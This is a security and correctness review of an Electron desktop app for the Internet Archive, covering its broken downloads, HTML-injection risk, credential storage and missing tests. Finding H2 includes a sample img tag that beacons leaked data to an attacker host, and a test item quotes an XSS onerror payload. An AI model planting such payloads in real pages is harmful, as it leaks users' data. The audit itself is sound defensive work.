# IA Desktop — Code Review & Recommendations

_Independent review of the codebase at version 0.1.3. Findings were produced by
four separate review passes (security, correctness/bugs, architecture/quality,
testing) and then de-duplicated, cross-checked, and prioritized. The two
critical/high items marked **VERIFIED** were confirmed by hand against the
source._

## How to read this

Each item has a severity, the file/line, what's wrong, and a concrete fix.
Severities: **Critical** (broken core feature or exploitable), **High**
(serious bug, security weakness, or distribution blocker), **Medium**
(reliability/robustness/maintainability), **Low** (polish / defense-in-depth).

A suggested order of work is at the bottom.

---

## Critical

### C1. Item-detail downloads are completely broken (wrong argument shape) — **VERIFIED**
**`src/renderer/renderer.js:367, 374, 407`**

`startDownload(items, label)` expects `items` to be an **array** of
`{ identifier, title }` objects (see the correct callers at `:281` `quickDownload`
and `:478` "Download selected"). But all three item-modal buttons call it with a
**string identifier** and a **file array**:

```js
startDownload(identifier, files)   // "Download all"      :367
startDownload(identifier, picked)  // "Download selected" :374
startDownload(identifier, [f])     // per-file "Get"      :407
```

Downstream, `main.js:204` does `for (const item of items)` — iterating the
**characters** of the identifier string, fetching metadata for bogus single-char
identifiers, while the actual files the user selected are passed as `label` and
silently discarded. The guard `if (!items || !items.length)` (`:463`) passes
because a string has `.length`.

Net effect: **every download initiated from the item-detail view fails or
produces garbage.** Only the result-card "Download" button works (it calls
`quickDownload(id, title)` correctly).

**Fix:** make the modal callers pass the documented shape, e.g.
`startDownload([{ identifier, title, files }], title)`. Capture the item title
when building the toolbar (it isn't in scope in those closures today). Add a unit
test that pins `startDownload`'s contract, and a guard in the `download:start`
handler that rejects a non-array `items` (see M5).

---

## High

### H1. Download resume can silently corrupt or endlessly re-fetch files — **VERIFIED**
**`src/main/ia-client.js:118-153`**

Two related problems in `downloadFile`:

1. **Files with no known size are never "complete."** The skip-if-complete check
   (`:118`) requires `expectedSize != null`. When an IA file record lacks a
   `size`, a fully downloaded file is re-`Range`-requested on every run (`:122`
   sets `startByte = stat.size` and appends), and can be appended to forever.
2. **No integrity validation.** On `'finish'` the code resolves with
   `bytes: received` and never compares to `expectedSize`/`Content-Length`. A
   connection dropped mid-stream resolves "successfully" with a short file. A
   `206` response whose `Content-Range` doesn't start at `startByte` (or a
   multipart byteranges response) is appended blindly, corrupting the file.

**Fix:** (a) for files with no `expectedSize`, don't enter resume/append
mode — download fresh with `'w'`; (b) validate the `Content-Range` header on
`206` and fall back to truncate+restart on mismatch; (c) on success, verify
`received === total` when `total` is known and reject/mark incomplete otherwise.

### H2. `sanitizeBasic` is a hand-rolled blacklist sanitizer for attacker-controlled HTML
**`src/renderer/renderer.js:359-362` (sink), `:431-441` (sanitizer)**

Item descriptions (settable by anyone who uploads an item) are injected via
`innerHTML`. `sanitizeBasic` only removes `script/style/iframe/object/embed` and
`on*`/`javascript:` attributes — the canonical leaky pattern (SVG event vectors,
DOM clobbering, `<a href="data:…">`, `<form formaction>`). Today the strict CSP
(`script-src 'self'`, no `unsafe-inline`) blocks code execution, so this is **not
full XSS right now** — but it is live HTML injection, and with `img-src https:`
wide open (H3/L-CSP) an injected `<img src="https://evil/?leak=…">` can beacon
data out. It becomes full XSS the moment the CSP is loosened.

**Fix:** render descriptions as **plain text** (`{ text: desc }`) — simplest and
safest — or bundle a vetted sanitizer (DOMPurify, CSP-compatible) with a strict
allowlist. Do not maintain a custom blacklist.

### H3. Screenshot/debug code ships in production with an arbitrary-file-write primitive
**`src/main/main.js:31-33, 68-86`**

The `--screenshot=<path>` branch is in the shipped `createWindow()` and is **not**
gated behind `isDev` (only DevTools is). In the packaged app, anyone who can pass
argv can run `IA Desktop --screenshot=/arbitrary/path.png`, causing the app to
capture the window and `fs.writeFileSync` to a caller-chosen path, then silently
`app.exit(0)`.

**Fix:** gate the whole screenshot path behind `isDev` (`if (isDev &&
screenshotPath)`), or strip it from production via the electron-builder `files`
glob. At minimum, refuse when `!isDev`.

### H4. No code signing / notarization — the app is undistributable to its target users
**`package.json:35-57`**

No `mac.hardenedRuntime`, entitlements, notarization, or Windows Authenticode
config. Unsigned macOS apps are Gatekeeper-blocked ("damaged") and Windows builds
trip SmartScreen — fatal for the stated audience ("without the command line").
Worse, `safeStorage` (used for credentials) is keyed to the app's signing
identity; without a stable signed identity, saved logins can be silently
invalidated between builds.

**Fix:** add `mac.hardenedRuntime: true` + entitlements + notarization
(`@electron/notarize` with an Apple API key) and Windows code signing. Document
the required secrets. If signing isn't available yet, state it plainly in the
README install steps (current README does note unsigned + Gatekeeper steps — keep
that until signing lands).

### H5. `downloadJobs` map is shared by downloads AND uploads
**`src/main/main.js:39, 191, 248, 272, 299`; `src/preload/preload.js:45`**

Both `download:start` and `upload:start` store their `AbortController` in the same
`downloadJobs` map, and a single `download:cancel` handler serves both (preload
routes `upload.cancel` → `download:cancel`). JobIds are unique within a session
via `nextJobId()` (`renderer.js:33`), but `jobSeq` **resets to 0 on every
renderer reload**, so a reload during an in-flight job can collide keys — one
job's `finally { downloadJobs.delete(jobId) }` then removes the other's
controller, making its Cancel silently no-op.

**Fix:** use separate `downloadJobs`/`uploadJobs` maps and a dedicated
`upload:cancel` channel (or namespace keys `dl:`/`up:`). Seed `jobSeq` with a
random per-session prefix so reloads can't collide.

---

## Medium

### M1. Metadata-edit feature is dead code and likely uses the wrong patch format
**`src/preload/preload.js:48-50`; `src/main/ia-client.js:189-207`; no renderer caller**

`window.ia.metadata.modify` and the `metadata:modify` handler exist, but
**nothing in `renderer.js` calls them** — there's no edit UI, so the feature is
unreachable. When it is wired up, two issues will bite: (a) archive.org's
metadata-write API expects an **RFC 6902 JSON Patch array**
(`[{"op":"replace","path":"/title","value":"…"}]`), not a plain object — the code
forwards `patches` verbatim; (b) auth is sent as `access`/`secret` **form fields**
(`:194-195`) rather than the `Authorization: LOW access:secret` **header** used by
`uploadFile`. Inconsistent and possibly wrong.

**Fix:** either remove the dead path, or finish it — add an edit form, build
proper JSON-Patch arrays, and authenticate via the header (`core.authHeader`).

### M2. No input validation / authorization at the IPC boundary
**`src/main/main.js` — `download:start:189`, `upload:start:269`, `metadata:modify:305`**

Handlers trust renderer payloads. `download:start` iterates `items` without
checking it's an array of well-formed objects and uses `destRoot` verbatim as the
write root. `upload:start`/`metadata:modify` never validate `identifier` against
the IA identifier rule (`validIdentifier` exists but only runs renderer-side in
the form, which is not a security boundary). `metadata:modify` can mutate any item
the user can edit with no confirmation.

**Fix:** add a validation layer at the top of each handler: assert
`Array.isArray(items)`, each `identifier` matches `validIdentifier`, `destRoot` is
an existing absolute directory, `prefs` keys are within the known enum, `patches`
is a plain object/array. Reject otherwise. (Move `validIdentifier` to a shared
module — see M8.)

### M3. Download path containment is best-effort only (no canonical-path check)
**`src/main/main.js:214, 229` + `sanitizeDir:317`, `sanitizeRel:322`; write at `ia-client.js:113, 152`**

`sanitizeDir`/`sanitizeRel` strip `..`, control chars, and reserved characters
from attacker-controlled file/identifier names — which blocks the known traversal
vectors — but there is **no final `path.resolve(destPath).startsWith(root)`
containment assertion.** The defense rests entirely on the character blacklists
being complete on every OS (leading separators, Unicode/overlong sequences,
symlink following). `destRoot` itself is renderer-supplied.

**Fix:** after computing `destPath`, canonicalize and assert it stays under the
item directory, and the item directory under `destRoot`:
`if (!path.resolve(destPath).startsWith(path.resolve(itemDir) + path.sep)) throw`.
Make this the primary control; keep the blacklists as belt-and-suspenders.

### M4. Empty/unset `destRoot` is not validated in the download handler
**`src/main/main.js:201, 214`**

The renderer guards with `ensureDest()`, but `download:start` does no check. With
`destRoot === undefined`, `path.join(undefined, …)` throws `ERR_INVALID_ARG_TYPE`;
with `''`, files land in a **relative path resolved against the app CWD** —
silently wrong location.

**Fix:** validate `destRoot` is a non-empty string resolving to an existing
directory before building the work list; otherwise `send` an error phase and
return `{ ok:false }`.

### M5. Inconsistent IPC error contract
**`src/main/main.js` (compare handlers)**

`download:start`/`upload:start`/`metadata:modify` catch and return `{ ok, error }`.
But `auth:login`, `search:*`, `item:metadata`, `settings:*`, `dialog:*` let
exceptions propagate as **rejected invokes**, surfacing as
`"Error invoking remote method '…': …"` in the UI. The renderer then handles the
two worlds differently (`try/catch` in some places, `res.ok` checks in others).
Every new handler is a coin-flip on which contract it follows.

**Fix:** pick one. A single `handle(channel, fn)` wrapper that catches and returns
`{ ok, data?, error? }` uniformly (with sanitized messages) is cleanest; update
the renderer to one handling style and document it in `CLAUDE.md`.

### M6. Deep paging silently breaks past advancedsearch.php's ~10k window
**`src/main/ia-core.js:80-90`; renderer pager `renderer.js:138-144`**

`advancedsearch.php` caps deep paging (historically `page*rows` must stay under
~10,000). The renderer computes `pages = ceil(numFound / 48)` and offers Next up
to that many pages — for a million-hit query it offers ~20,000 pages, but
requesting past page ~208 returns an error or empty `docs`, surfaced as a generic
"Search failed." toast or a blank page.

**Fix:** cap the pager at `Math.floor(10000 / ROWS)` with a "refine your search to
see more" note, or switch deep paging to the supported **scraping API**
(`/services/search/v1/scrape` with a cursor).

### M7. Plaintext credential fallback writes the S3 secret + cookies unencrypted
**`src/main/store.js:42-45` (write), `:48-62` (read)**

When `safeStorage.isEncryptionAvailable()` is false (real on some Linux/
misconfigured systems), credentials — including the long-lived S3 **secret** and
session cookies — are written as **plaintext JSON** to a file named
`credentials.enc` (misleading), with default permissions (often world-readable).
The read path also falls back to parsing plaintext even when encryption is
available, so a dropped-in plaintext file would be trusted.

**Fix:** fail closed when encryption is unavailable — keep creds in memory only
and warn the user, rather than silently writing plaintext. If a fallback file
must exist, use `{ mode: 0o600 }` and don't name it `.enc`. On read, require
decryption when `safeStorage` is available.

### M8. `renderer.js` is a 675-line imperative monolith with module-level mutable state
**`src/renderer/renderer.js` (whole file)**

Toast, auth, tab routing, search+paging, result rendering, selection model, item
modal, downloads, settings, and upload all share module-scoped mutables
(`activeSearch`, `prefs`, `destRoot`, `selected`, `lastDocs`, `uploadFiles`, …).
The pure logic was correctly extracted (good), but the controller/DOM glue is
untestable and grows linearly with each feature. This file is also where C1 hid.

**Fix:** split into per-feature controller modules (`search.js`, `downloads.js`,
`upload.js`, `settings.js`, `item-modal.js`), each loaded as a `<script>` and
owning its own state with a small `init()`. (CSP forbids inline/eval, so a
multi-`<script>` split fits; a light bundler like esbuild is the next step if real
ES modules are wanted.)

### M9. `view-prefs.js` is required across the main↔renderer boundary
**`src/main/main.js:28` → `require('../renderer/view-prefs')` (also `:158, :196`)**

The file is dual-loadable today (UMD-style IIFE, no DOM), so it works — but
reaching from `src/main/` into `src/renderer/` inverts the layering. The day
someone adds a `document`/`window` reference (it looks like a renderer file), the
main process breaks at startup.

**Fix:** move genuinely shared pure logic to `src/shared/` (e.g.
`src/shared/view-prefs.js`, and the identifier validator from M2/M8) and import it
from both sides.

### M10. No CI, no linter/formatter, no coverage measurement
**repo root (no `.github/`, no eslint/prettier/editorconfig, no coverage script)**

`CLAUDE.md` mandates "commit only after `npm test` passes" and a bump→commit→
rebuild release ritual, but nothing enforces any of it. There's an inline
`// eslint-disable-next-line` (`ia-core.js:44`) implying ESLint was expected, yet
no config exists. No objective signal of the (large) untested surface.

**Fix:**
- Add ESLint (flat config) + `eslint-plugin-promise` (no-floating-promises — see
  L1) + Prettier + `.editorconfig`, separate env for `src/main`+`src/preload`
  (node) vs `src/renderer` (browser globals `uiUtil`/`viewPrefs`). Wire
  `npm run lint`.
- Add `"test:coverage": "node --test --experimental-test-coverage \"test/**/*.test.js\""`
  (no new dependency).
- Add a GitHub Actions workflow: `npm ci && npm test && npm run lint` on push/PR
  (macOS; nothing imports Electron at test time, so no display needed), plus a
  release job that runs `electron-builder` with signing secrets.

---

## Testing gaps (high-value, expand the suite)

The 79 tests are clean, fast (~110 ms), deterministic, and genuinely TDD — but
they cover **only the pure modules**. Everything touching network, filesystem,
Electron, IPC, or the DOM has **zero** direct coverage. Priority order:

### T1. `ia-client.js` has no tests — the entire network surface is unverified
login/search/getMetadata/modifyMetadata error+parse branches, and
`downloadFile`'s resume/skip/redirect/abort logic (the home of H1). The module
already uses global `fetch` + `node:https` — inject them.
**Fix:** add `test/helpers/fake-fetch.js` (swap `globalThis.fetch`, match by
method+URL, return fake `Response`s) for the JSON ops; use a loopback
`http.createServer` on `127.0.0.1:0` for `downloadFile`/`uploadFile` streaming
(pre-create a partial → serve 206 → assert final bytes; pre-create full → assert
`skipped`; redirect-follow; `controller.abort()` mid-stream).

### T2. No IPC-handler tests in `main.js`
`download:start`'s work-list + progress-phase protocol, the login precondition on
`upload:start`/`metadata:modify`, and `sanitizeDir`/`sanitizeRel` traversal
stripping are all untested.
**Fix:** refactor handler bodies into exported functions
(`handleDownloadStart({items,prefs,destRoot}, {ia, send})`) callable with a stub
`ia` and a `send` spy; assert the emitted phase sequence and the early returns.

### T3. `escapeHtml` — the renderer's XSS defense — is exported but never asserted
**`src/renderer/ui-util.js:72-79`.** One tiny, high-value test: `< > & " '`
encoded, `null`/`undefined` → `''`, and `<img src=x onerror=…>` fully escaped.

### T4. `store.js` credential round-trip untested (incl. the unencrypted fallback)
Testable without Electron (it guards `require('electron')`): point userData at a
tmpdir, round-trip `saveCredentials`/`loadCredentials`, `updateSettings` merge,
corrupt-file → `{}`. Add a test that **documents** the plaintext-fallback
behavior so M7 is a conscious decision.

### T5. Bake in network-test discipline now
Once T1/T2 land, the easy wrong path is hitting real archive.org. Use the
fake-fetch/loopback helpers exclusively; consider a CI guard that fails if a test
opens a non-loopback socket.

---

## Low / polish

- **L1. Fire-and-forget async IPC in the renderer.** `window.ia.download.start(…)`
  (`renderer.js:473`) and `.cancel(…)` (`:487`) are not awaited or `.catch`-ed.
  Safe today only because the handler returns `{ok:false}` instead of rejecting;
  if the invoke itself rejects it's an unhandled rejection with no UI feedback.
  Wrap in `.catch(e => toast(e.message,'err'))`. (A no-floating-promises lint rule
  catches these — M10.)
- **L2. Download job card shows "0 / 0 files" until the first byte.**
  (`renderer.js:469, 482`) The true count isn't known until main resolves
  metadata + filters; show "Preparing…" instead, and it won't get stuck at
  `0 / 0` when a job errors with "No matching files."
- **L3. Tighten CSP `img-src`.** (`index.html:7`) `img-src https: data:` allows
  loading/beaconing to any HTTPS host; thumbnails only ever hit
  `archive.org/services/img/…`. Restrict to
  `img-src https://archive.org https://*.archive.org;` to close the exfil channel
  behind H2.
- **L4. Enable the renderer sandbox.** (`main.js:55`) `sandbox: false` disables
  Chromium's OS-level renderer sandbox. The preload uses only
  `contextBridge`/`ipcRenderer` (sandbox-compatible), so `sandbox: true` should be
  a safe, high-value defense-in-depth change. Verify the preload still loads.
- **L5. Validate `shell:openPath` / `openExternal` schemes.** (`main.js:172, 89`)
  `openPath` opens any renderer-supplied path (code-exec risk for non-folders);
  constrain to directories under `destRoot` (or use `showItemInFolder`). In
  `setWindowOpenHandler`, only `openExternal` for `https:`/`mailto:`; add a
  `will-navigate` guard that prevents the renderer being navigated away.
- **L6. Surface real search errors.** (`ia-client.js:79-88`, `ia-query.js:51`)
  When archive.org returns `{error:…}` or an HTML error page, the user gets a
  generic "Search failed." Throw the real `json.error`, and validate/escape the
  raw free-text clause in `buildAdvancedQuery` (it wraps arbitrary input in
  parens, which can produce unbalanced-paren query errors).
- **L7. Derive `USER_AGENT` from `package.json` version.** (`ia-client.js:29`)
  Eliminates the manual version-sync ritual in `CLAUDE.md`. Centralize `HOST`/
  `S3_HOST` (defined in both `ia-core.js` and `view-prefs.js`) in one constants
  module.
- **L8. Adopt `// @ts-check` + JSDoc typedefs for IPC payloads and `creds`.** The
  most error-prone seams (IPC, the `download:progress` phase union) are the
  untyped ones; C1 is exactly the kind of cross-file contract drift a typedef
  catches. Add a `tsconfig.json` in `checkJs` mode to CI.
- **L9. Extract duplicated job scaffolding.** `download:start` and `upload:start`
  duplicate the AbortController/`send`/loop/`finally`-cleanup. Extract
  `runJob(jobId, channel, fn)`.
- **L10. Add `"engines": { "node": ">=18" }`** (built-in `fetch` + `node --test`
  glob need a recent Node), an `npm run screenshot` script, and confirm the icons
  electron-builder needs (`build/icon.icns`, `build/icon.ico`) are committed (a
  clean checkout must build).

---

## What's already good (keep doing this)

- **Pure-logic-in-testable-modules discipline** (`ia-core`, `ia-query`,
  `download-prefs`, `view-prefs`, `ui-util`, `menu-template`) — consistent and
  genuinely well done.
- **Security defaults:** `contextIsolation: true`, `nodeIntegration: false`, a
  tight CSP with `connect-src 'none'` + `script-src 'self'` (this is what
  neutralizes H2 from full XSS today), a minimal explicit preload bridge, and
  `setWindowOpenHandler` forcing external links to the OS browser.
- **No third-party runtime dependencies** (Node `fetch`/`https` only) — tiny,
  audit-clean install. Preserve this; if a sanitizer (H2) or bundler (M8) is
  added, weigh it against this.
- **Identifiers/filenames are `encodeURIComponent`-wrapped** before building IA
  URLs — prevents URL injection.
- **Genuine red/green TDD** with behavior-focused assertions and real-world
  fixtures (CJK queries, representative file lists, collision/truncation edges).

---

## Resolution status (TDD pass)

All findings were worked via strict red/green TDD. Summary:

- **Fixed + tested:** C1, H1, H2, H3, H5, M1, M2, M3, M4, M6, M7, L1, L2, L3,
  L4, L5, L6, L7, L8, L10. Plus the testing gaps T1–T4 (new helpers:
  `test/helpers/fake-fetch.js`, `test/helpers/loopback-server.js`; new modules
  with tests: `ipc-validate`, `ipc-handlers`, `cli-args`, `security`,
  `shared/constants`, `shared/pager`; store seams). Coverage script + CI added
  (M10, coverage+CI part).
- **Config + docs only (needs user-supplied secrets):** H4 — hardened runtime,
  entitlements, an env-gated notarize hook, and Windows signing config are
  wired; the build stays unsigned until Apple/Windows credentials are provided.
- **Consciously deferred (per owner decision — untestable/large refactors that
  conflict with the strict-TDD mandate):**
  - **M5** (uniform IPC error contract): migrating all ~19 renderer call sites
    to a `{ok,data,error}` envelope is a broad, untestable renderer change.
    The file/network handlers already use `{ok,error}`; the rest reject and are
    handled via try/catch. Left as-is by decision.
  - **M8** (split `renderer.js` into per-feature modules): pure DOM glue with no
    test harness; the genuinely-testable logic was already extracted
    (`toDownloadItems`, `makeJobIdFactory`, `descriptionText`, all tested).
  - **M10 linter** (ESLint/Prettier): skipped to preserve the zero-extra-tooling
    footprint; `.editorconfig` + coverage + CI were added instead.
  - **L9** (`runJob` extraction): after the download handler was reduced to a
    thin delegate, the remaining duplication is ~6 lines and untestable glue;
    not worth an abstraction.
  - **M1 edit UI:** the `modifyMetadata` correctness bugs are fixed (auth header,
    JSON-Patch-array contract documented); building an actual edit form is a new
    feature, not a fix, so it's out of scope here.

## Suggested order of work

1. **C1** — fix item-detail downloads (broken core feature, shipped). _Do first._
2. **H1** — download resume corruption/endless-refetch (data integrity).
3. **H2 + L3** — render descriptions as text (or DOMPurify) and tighten `img-src`.
4. **H3** — gate the screenshot file-write behind `isDev`.
5. **T1–T4** — add network/IPC/store/escapeHtml tests (locks in 1–3 and prevents
   regressions).
6. **H5, M2, M3, M4, M7** — job-map split, IPC validation, path containment,
   destRoot check, fail-closed credential fallback.
7. **M10** — ESLint/Prettier + coverage + CI (enforces everything above).
8. **M8 + M9 + L7/L8** — split `renderer.js`, move shared logic to `src/shared/`,
   typedefs/constants cleanup.
9. **H4** — code signing / notarization (required before public distribution).
10. **M1, M5, M6** and remaining Low items as the app grows.
